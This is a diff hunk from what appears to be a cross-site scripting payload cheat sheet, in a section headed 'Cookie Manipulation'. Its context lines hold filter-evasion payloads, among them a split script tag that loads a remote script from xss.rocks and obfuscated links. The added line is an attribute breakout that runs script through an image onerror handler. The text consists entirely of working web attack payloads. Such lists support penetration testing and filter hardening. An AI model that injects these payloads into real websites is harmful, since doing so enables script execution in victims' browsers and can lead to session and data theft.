@@ -282,7 +282,7 @@ Cookie Manipulation
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
 <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
 <A HREF="http://1113982867/">XSS</A>
-
+shirley"><img src=x onerror=alert(document.domain)>//shirley
 
 ```
 
